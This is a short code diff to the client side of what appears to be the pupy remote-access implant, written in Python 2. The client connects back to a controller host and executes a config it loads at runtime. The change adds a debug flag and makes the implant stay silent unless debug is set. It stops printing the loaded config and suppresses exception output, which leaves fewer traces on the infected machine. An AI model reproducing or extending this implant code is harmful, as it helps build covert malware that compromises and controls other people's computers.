@@ -196,11 +196,12 @@ def set_connect_back_host(HOST):
     pupy.get_connect_back_host = (lambda: HOST)
 
 attempt = 0
-
+debug = False
 
 def main():
     global LAUNCHER
     global LAUNCHER_ARGS
+    global debug
     global attempt
 
     if len(sys.argv) > 1:
@@ -224,6 +225,7 @@ def main():
         args = parser.parse_args()
         if args.debug:
             logging.getLogger().setLevel(logging.DEBUG)
+        debug = bool(args.debug)
         LAUNCHER = args.launcher
         LAUNCHER_ARGS = shlex.split(' '.join(args.launcher_args))
 
@@ -233,7 +235,6 @@ def main():
     if 'get_pupy_config' in pupy.__dict__:
         try:
             config_file = pupy.get_pupy_config()
-            print "CONFIG FILE: {}".format(config_file)
             exec config_file in globals()
         except ImportError:
             logging.warning(
@@ -266,10 +267,11 @@ def main():
             if type(e) == SystemExit:
                 exited = True
 
-            try:
-                logging.exception(e)
-            except:
-                print "Exception ({}): {}".format(type(e), e)
+            if debug:
+                try:
+                    logging.exception(e)
+                except:
+                    print "Exception ({}): {}".format(type(e), e)
 
         finally:
             if not exited:
@@ -279,6 +281,7 @@ def main():
 
 def rpyc_loop(launcher):
     global attempt
+    global debug
 
     for ret in launcher.iterate():
         try:
@@ -331,10 +334,11 @@ def rpyc_loop(launcher):
             pass
 
         except Exception as e:
-            try:
-                logging.exception(e)
-            except:
-                print "Exception ({}): {}".format(type(e), e)
+            if debug:
+                try:
+                    logging.exception(e)
+                except:
+                    print "Exception ({}): {}".format(type(e), e)
 
 if __name__ == "__main__":
     main()
